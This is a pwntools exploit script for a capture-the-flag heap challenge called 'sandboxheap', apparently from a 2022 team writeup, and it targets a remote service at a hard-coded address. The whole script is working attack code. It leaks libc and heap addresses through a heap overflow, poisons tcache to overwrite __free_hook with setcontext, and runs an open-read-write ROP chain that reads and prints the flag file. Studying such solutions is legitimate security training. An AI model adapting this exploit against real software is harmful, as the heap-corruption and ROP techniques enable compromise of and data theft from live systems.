# https://su-team.cn/passages/2022-xyb-SU-Writeup/
from pwn import *
context(os = "linux", arch = "amd64", log_level = "debug")
#io = process(["./sandbox", "./sandboxheap"])
io = remote("101.201.71.136", 12795)
elf = ELF("./sandboxheap")
libc = ELF("./libc-2.27.so")
def add(idx, size):
    io.sendlineafter("Your choice: ", "1")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(size))
def edit(idx, content):
    io.sendlineafter("Your choice: ", "2")
    io.sendlineafter("Index: ", str(idx))
    io.sendafter("Content: ", content)
def show(idx):
    io.sendlineafter("Your choice: ", "3")
    io.sendlineafter("Index: ", str(idx))
def delete(idx):
    io.sendlineafter("Your choice: ", "4")
    io.sendlineafter("Index: ", str(idx))
def convert(st):
    tar=""
    for i in st:
        b=(bin(i)[2:].rjust(8,'\x00')[::-1])
        tar+=b
    return tar
for i in range(11):
    add(i, 0x88)
for i in range(7):
    delete(i)
delete(7)
edit(8, b'1' * 0x80 * 8 + b'00000100' + \
     b'10000000' + b'00000000' * 6 + b'00000000')
delete(9)
for i in range(7):
    add(i, 0x88)
add(7, 0x88)
show(8)
libc_base = u64(io.recvuntil("\x7f")[-6:].ljust(8, b'\x00')) - 0x3ebca0
success("libc_base:\t" + hex(libc_base))
add(9, 0x110)
add(13, 0x110)
add(14, 0x110)
delete(13)
delete(9)
show(8)
io.recvuntil("Content: ")
heap_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x010 -0x880
success("heap_base:\t" + hex(heap_base))
free_hook = libc_base+libc.symbols["__free_hook"]
edit(8, bin((free_hook))[2:][::-1].ljust(64, '\x00'))
add(9, 0x110)
add(11, 0x110)
setcontext = libc_base + libc.symbols["setcontext"] + 53
pop_rdi_ret = libc_base + 0x000000000002164f
pop_rsi_ret = libc_base + 0x0000000000023a6a
pop_rdx_r12_ret = libc_base + 0x0000000000130514
pop_rax_ret = libc_base + 0x000000000001b500
syscall = libc_base + 0x00000000000d2625
flag = bin(0x67616c662f2e)[2:].rjust(64, '\x00').encode()[::-1]
edit(1,flag)
frame = SigreturnFrame()
frame.rsp = heap_base + 0x6f0
frame.rdi = 0
frame.rsi = heap_base + 0x6f0
frame.rdx = 0x200
frame.rip = libc.symbols["read"] + libc_base
orw = p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rax_ret) + p64(0x2710)
orw += p64(syscall)
orw += p64(pop_rdi_ret) + p64(heap_base + 0x530)
orw += p64(pop_rsi_ret) + p64(0)
orw += p64(pop_rax_ret) + p64(2)
orw += p64(syscall)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rsi_ret) + p64(heap_base + 0x5b0)
orw += p64(pop_rdx_r12_ret) + p64(0x30) + p64(0)
orw += p64(pop_rax_ret) + p64(0)
orw += p64(syscall)
orw += p64(pop_rdi_ret) + p64(1)
orw += p64(pop_rsi_ret) + p64(heap_base + 0x5b0)
orw += p64(pop_rdx_r12_ret) + p64(0x30) + p64(0)
orw += p64(pop_rax_ret) + p64(1)
orw += p64(syscall)
edit(11, bin((setcontext))[2:][::-1].ljust(64, '\x00'))
bin_frame = convert(bytes(frame))
add(12, 0x98)
edit(12, bin_frame[0:0x98*8])
add(15, 0x98)
edit(15, bin_frame[0xa0*8:])
delete(12)
io.send(orw)
io.interactive()


